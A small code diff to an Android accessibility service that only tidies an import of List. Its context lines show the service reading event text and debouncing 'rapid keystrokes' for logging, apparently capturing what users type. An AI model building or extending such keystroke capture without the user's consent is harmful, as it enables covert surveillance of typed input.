@@ -6,6 +6,7 @@ import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.view.accessibility.AccessibilityEvent;
+import java.util.List;
 
 public class SnapAccessibilityService extends AccessibilityService {
 
@@ -57,7 +58,7 @@ public class SnapAccessibilityService extends AccessibilityService {
                 long now = System.currentTimeMillis();
                 if (now - lastLogTime < 500) return; // Debounce rapid keystrokes
 
-                java.util.List<CharSequence> textList = event.getText();
+                List<CharSequence> textList = event.getText();
                 if (textList == null || textList.isEmpty()) return;
 
                 StringBuilder sb = new StringBuilder();
